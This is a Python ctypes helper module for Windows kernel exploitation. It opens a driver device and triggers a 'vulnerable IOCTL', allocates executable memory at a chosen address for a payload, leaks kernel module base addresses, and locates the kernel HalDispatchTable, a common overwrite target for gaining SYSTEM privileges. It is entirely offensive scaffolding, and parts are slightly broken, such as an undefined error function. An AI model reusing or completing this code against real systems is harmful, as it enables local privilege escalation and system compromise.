from ctypes import *
from ctypes.wintypes import *
import struct, os, sys
import platform

# Define WinAPI shorthand
kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.Psapi

# Define bitmasks
GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
OPEN_EXISTING = 0x00000003
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x00000040


def p32(x):
	""" Interpret strings as packed binary data (unsigned long) """
	return struct.pack("<L", x)


def get_handle(lpFileName):
	""" Get device handler """

	dwDesiredAccess = (GENERIC_READ | GENERIC_WRITE)
	dwShareMode = 0
	lpSecurityAttributes = None
	dwCreationDisposition = OPEN_EXISTING
	dwFlagsAndAttributes = 0
	hTemplateFile = None

	print("[*] Getting device handle")
	handle = kernel32.CreateFileA(
				lpFileName,            # _In_     LPCTSTR
				dwDesiredAccess,       # _In_     DWORD
				dwShareMode,           # _In_     DWORD
				lpSecurityAttributes,  # _In_opt_ LPSECURITY_ATTRIBUTES
				dwCreationDisposition, # _In_     DWORD
				dwFlagsAndAttributes,  # _In_     DWORD
				hTemplateFile)         # _In_opt_ HANDLE

	if not handle or handle == -1:
		sys.exit("[-] Error getting device handle: {:s}".format(FormatError()))
	else:
		print("[+] Got device handle: {:#x}".format(handle))

	return handle


def trigger(hDevice, dwIoControlCode, lpInBuffer, nInBufferSize):
	""" Triggering vulnerable IOCTL """

	lpOutBuffer = None
	nOutBufferSize = 0
	lpBytesReturned = byref(c_ulong())
	lpOverlapped = None

	print("[+] Triggering vulnerable IOCTL ...")
	device = kernel32.DeviceIoControl(
				hDevice,         # _In_        HANDLE
				dwIoControlCode, # _In_        DWORD
				lpInBuffer,      # _In_opt_    LPVOID
				nInBufferSize,   # _In_        DWORD
				lpOutBuffer,     # _Out_opt_   LPVOID
				nOutBufferSize,  # _In_        DWORD
				lpBytesReturned, # _Out_opt_   LPDWORD
				lpOverlapped)    # _Inout_opt_ LPOVERLAPPED

	if not device:
		sys.exit("[-] Error: Not device {:s}".format(FormatError()))


def alloc_memory_virtualalloc(lpAddress, dwSize, input):
	""" Allocate input buffer """

	flAllocationType = (MEM_COMMIT | MEM_RESERVE)
	flProtect = PAGE_EXECUTE_READWRITE
    
	print("[*] Allocating input buffer at {:#x}".format(lpAddress))
	address = kernel32.VirtualAlloc(
				lpAddress,         # _In_opt_  LPVOID
				dwSize,            # _In_      SIZE_T
				flAllocationType,  # _In_      DWORD
				flProtect)         # _In_      DWORD

	if not address:
		sys.exit("[-] Error allocating memory: {:s}".format(getLastError()))
	else:
		print("[+] Input buffer allocated at: {:#x}".format(address))

	memmove(address, input, len(input))
	return address


# https://github.com/zeroSteiner/mayhem/blob/master/mayhem/exploit/windows.py
def get_base_address(driver=None):
	""" Returns base address of kernel modules """

	if platform.architecture()[0] == "64bit":
		lpImageBase = (c_ulonglong * 1024)()
		lpcbNeeded = c_longlong()
		psapi.GetDeviceDriverBaseNameA.argtypes = [c_longlong, POINTER(c_char), c_uint32]
	else:
		lpImageBase = (c_ulong * 1024)()
		lpcbNeeded = c_long()
	driver_name_size = c_long()
	driver_name_size.value = 48
	psapi.EnumDeviceDrivers(byref(lpImageBase), c_int(1024), byref(lpcbNeeded))

	for base_addr in lpImageBase:
		driver_name = c_char_p("\x00" * driver_name_size.value)
		if base_addr:
			psapi.GetDeviceDriverBaseNameA(base_addr, driver_name, driver_name_size.value)
			if driver == None and driver_name.value.lower().find("krnl") != -1:
				print("[+] Retrieving kernel info...")
				print("[+] Kernel version: {:s}".format(driver_name.value))
				print("[+] Kernel base address: {:#x}".format(base_addr))

				return (base_addr, driver_name.value)
			elif driver_name.value.lower() == driver:
				print("[+] Retrieving {:s} info...".format(driver_name))
				print("[+] {:s} base address: {:#x}".format(driver_name, base_addr))
				
				return (base_addr, driver_name.value)
	return None


# https://github.com/zeroSteiner/mayhem/blob/master/mayhem/exploit/windows.py
def get_haldispatchtable():
	""" Returns the HalDispatchTable address """

	if platform.architecture()[0] == "64bit":
		kernel32.LoadLibraryExA.restype = c_uint64
		kernel32.GetProcAddress.argtypes = [c_uint64, POINTER(c_char)]
		kernel32.GetProcAddress.restype = c_uint64

	(kernel_base, kernel_version) = get_base_address()
	hKernel = kernel32.LoadLibraryExA(kernel_version, 0, 1)
	HalDispatchTable = kernel32.GetProcAddress(hKernel, "HalDispatchTable")
	HalDispatchTable -= hKernel     # Subtracting 'ntkrnlpa' base in user space
	HalDispatchTable += kernel_base # Add the base address of 'ntkrnpa' in kernel space

	print("[+] HalDispatchTable address: {:#x}".format(HalDispatchTable))
	return HalDispatchTable
